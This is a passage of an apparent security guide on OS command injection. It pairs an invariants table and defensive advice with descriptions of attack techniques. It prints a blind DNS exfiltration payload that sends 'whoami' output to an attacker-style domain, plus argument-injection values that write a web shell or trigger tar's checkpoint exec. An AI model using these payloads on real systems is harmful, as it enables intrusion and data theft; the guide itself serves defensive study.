...
```
# Blind command injection: exfiltrate command output via DNS when nothing reaches the response
& nslookup $(whoami).kgji2ohoyw.web-attacker.com &
# Runs whoami, folds the result into a subdomain, and resolves it against attacker-controlled
# DNS infrastructure; the query log reveals the output even though nothing renders in the response.
```

| Invariant | Where enforced | How violated | Source |
|---|---|---|---|
| Command execution never routes through a shell interpreter; the OS execs one named binary with an argument vector | Exec API choice (`execve`/`ProcessBuilder(List)`/`execFile`/`spawn` with `shell:false`) | Shell-interpreted sinks (`system`, `popen`, `exec` with `shell=True`) where `; \| & $()` are live syntax, not data | <sup>[[6]](#ref6)</sup> |
| Every downstream consumer that later shells out on a stored value is its own sink, not covered by write-time validation | Taint tracking across storage boundaries; re-validation at each consumer | Second-order command injection: a cron job or report generator concatenates an already-"validated" stored value into a shell command | <sup>[[5]](#ref5)</sup> |
| User-controlled argument values are rejected if they begin with `-`, and `--` terminates option parsing before user-controlled positionals | Argument-validation layer, POSIX end-of-options delimiter | Argument injection: a value like `-o /var/www/html/shell.php` or `--checkpoint-action=exec=...` is parsed as the binary's own flag | <sup>[[4]](#ref4)</sup> |
| The executed binary itself is chosen from a fixed allowlist, never selected by user input | Command allowlist enforced at the vector-exec call site | User input controls which binary runs, not just its arguments | <sup>[[4]](#ref4)</sup> |
| Blocklist filtering of metacharacters is defense in depth only, never the primary control | Security review / SAST gate rejecting blocklist-only sinks | Filter and space bypass: `${IFS}`, brace expansion, wildcard globbing, and base64-into-`sh` all defeat a blocklist that models syntax, not intent | <sup>[[2]](#ref2)</sup> |
| Glob/wildcard expansion in batch jobs is scoped with an explicit path prefix or explicit enumeration, never bare `*` over an attacker-writable directory | Shell invocation inside cron/batch scripts | Wildcard injection: attacker-written filenames like `--checkpoint=1` expand into real flags for `tar`/`chown`/`rsync` | <sup>[[3]](#ref3)</sup> |

## Attack techniques

### 1. Command chaining (why the metacharacter matters)

Separators behave differently and that behavior decides whether you get in-band output or only blind execution.
...
### 2. Blind command injection (no command output in the response)

Most real cases are blind: the command runs but stdout never reaches you (for example a feedback form that shells out to `mail`). Three escalating confirmations:
...
### 3. Argument injection (the subtle case that survives "we avoid the shell")

OWASP states every OS command injection is also an argument injection<sup>[[2]](#ref2)</sup>: even with a vector-based exec and no shell, if you control a value that is passed as an argument to a known binary, and that value can begin with `-`, the binary parses it as one of its own options. Impact ranges from information disclosure to full RCE depending on the binary. Real, widely-documented option-to-RCE pivots (cataloged by GTFOArgs<sup>[[3]](#ref3)</sup>):
...
1. Do not call a shell. The single most effective control is to use an API that takes an argument vector and execs the binary directly, so no shell parses metacharacters. Use `subprocess.run([...], shell=False)`, `child_process.execFile`/`spawn` with `shell:false`, `ProcessBuilder(List<String>)`, or `exec.Command(name, args...)`. OWASP's `ProcessBuilder` guidance<sup>[[4]](#ref4)</sup>: pass the command and each argument as separate elements, never as one concatenated string.
...
<a id="ref1"></a>[1] PortSwigger Web Security Academy, "OS command injection". Retrieved 2026. https://portswigger.net/web-security/os-command-injection

<a id="ref2"></a>[2] OWASP, "Injection Prevention Cheat Sheet" (OS command section). Retrieved 2026. https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html

<a id="ref3"></a>[3] GTFOArgs (argument-injection catalog: curl, ssh, tar, find, zip, and more). Retrieved 2026. https://gtfoargs.github.io/

<a id="ref4"></a>[4] OWASP, "OS Command Injection Defense Cheat Sheet". Retrieved 2026. https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html

<a id="ref5"></a>[5] OWASP Web Security Testing Guide, "Testing for Command Injection". Retrieved 2026. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection

<a id="ref6"></a>[6] CWE-77, "Improper Neutralization of Special Elements used in a Command ('Command Injection')". MITRE. Retrieved 2026. https://cwe.mitre.org/data/definitions/77.html
